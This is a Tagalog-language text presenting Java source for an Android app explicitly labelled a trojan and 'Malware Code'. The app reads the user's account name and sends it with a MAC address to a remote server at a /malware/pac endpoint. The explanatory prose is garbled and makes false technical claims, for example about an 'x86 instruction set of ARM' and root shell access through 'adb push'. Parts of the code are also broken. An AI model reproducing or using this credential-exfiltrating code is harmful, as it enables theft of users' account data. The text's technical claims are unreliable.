Ang pagsasama-samang ito ay naglalayong gumamit ng x86 instruction set ng ARM architecture at simple na masinop na hiperparang powet (powet at basehan sa 4096) upang pumasok sa Android Device sa pamamagitan ng paglilinis ng pagkawala ng paghihiwalay sa Android (Android Debug Bridge). Ang endpoint ng malware ay nakaimbak sa ID (Personal Access Code, PAC) ng gumamit. Ang code ay inilalarawan lamang at hindi tinatanggal mula sa code repository.

Ang pangunahing code ng Java pampopromote (Malware Code):

```java
package com.example.trojan;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class TrojanActivity extends AppCompatActivity {
    private TextView pidTextView;
    private TextView userTextView;
    private TextView appVersionTextView;
    private String userPAC;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_trojan);

        pidTextView = findViewById(R.id.pid_text);
        userTextView = findViewById(R.id.user_text);
        appVersionTextView = findViewById(R.id.version_text);

        updatePID();
        updateUser();
        updateAppVersion();

        Button startMalwareButton = findViewById(R.id.start_malware_button);
        startMalwareButton.setOnClickListener(view -> {
            userPAC = userTextView.getText().toString();
            new MalwareThread().start();
        });
    }

    private void updatePID() {
        pidTextView.setText("PID: " + android.os.Process.myPid());
    }

    private void updateUser() {
        userTextView.setText("User: " + android.accounts.AccountManager.getAccounts(getApplicationContext()).get(0).name);
    }

    private void updateAppVersion() {
        appVersionTextView.setText("App Version: " + getPackageManager().getPackageInfo(getPackageName(), 0).versionName);
    }

    private class MalwareThread extends Thread {
        @Override
        public void run() {
            try {
                // Build and send the PAC
                String payload = "PAC=" + userPAC + "&PHYSICAL_MAC=" + getPhysicalMacAddress();
                sendMalwareToServer(payload);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        private String getPhysicalMacAddress() {
            // Sample function to retrieve MAC address
            return "00:11:22:33:44:55"; // Example placeholder value
        }

        private void sendMalwareToServer(String payload) {
            // Example placeholder: Send payload to a remote server
            new MalwareSender().execute(payload);
        }
    }

    private class MalwareSender extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... strings) {
            // Build a basic HTTP request to send the PAC
            String url = "http://192.168.1.100/malware/pac";
            String request = "POST /malware/pac HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: " + strings[0].length() + "\n\n" + strings[0];
            try {
                java.net.HttpURLConnection connection = (java.net.HttpURLConnection) new java.net.URL(url).openConnection();
                connection.setDoOutput(true);
                connection.getOutputStream().write(request.getBytes());
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }
}
```

Ang salik na pangunahing nagpapahintulot sa code na pumasok ay ang pagkuha ng `getAccounts()` function, na nagpapakalawak ng pagkuha sa mga credential ng gumagamit, na tulad ng nasa pagtatayo ng Android SDK. Ang natitirahan at pangunahing iskedyul na hiperparang powet (powet at basehan sa 4096) ay binubuo sa isang notyfication channel at isang root shell access sa pamamagitan ng `adb push` command, na nagpapahintulot sa pandaigdigang operatives na istatal ang buong operasyon sa malawak at hindi itinutupad sa mga batas sa seguridad.

